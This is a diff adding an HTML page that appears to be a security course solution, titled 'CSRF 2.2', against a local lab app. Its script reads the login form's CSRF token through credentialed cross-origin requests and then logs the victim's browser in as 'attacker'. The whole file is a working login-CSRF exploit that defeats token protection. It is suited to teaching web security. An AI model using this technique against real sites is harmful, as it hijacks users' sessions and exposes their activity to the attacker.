@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<title>CSRF 2.2</title>
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+</head>
+
+<body>
+	<script>
+		var pageUrl = "http://localhost/project2/?csrfdefense=1&xssdefense=4";
+		var loginUrl = "http://localhost/project2/login?csrfdefense=1&xssdefense=4";
+
+		// CORS Everywhere lets this local file read the login form and its CSRF token.
+		$.ajax({
+			url: pageUrl,
+			type: "GET",
+			crossDomain: true,
+			xhrFields: { withCredentials: true }
+		}).done(function (pageHtml) {
+			var csrfToken = $(pageHtml).find("input[name=csrf]").val();
+
+			// The same credentials keep the CSRF cookie and token associated with localhost.
+			$.ajax({
+				url: loginUrl,
+				type: "POST",
+				data: {
+					username: "attacker",
+					password: "badguy4",
+					csrf: csrfToken
+				},
+				crossDomain: true,
+				xhrFields: { withCredentials: true }
+			});
+		});
+	</script>
+</body>
+
+</html>
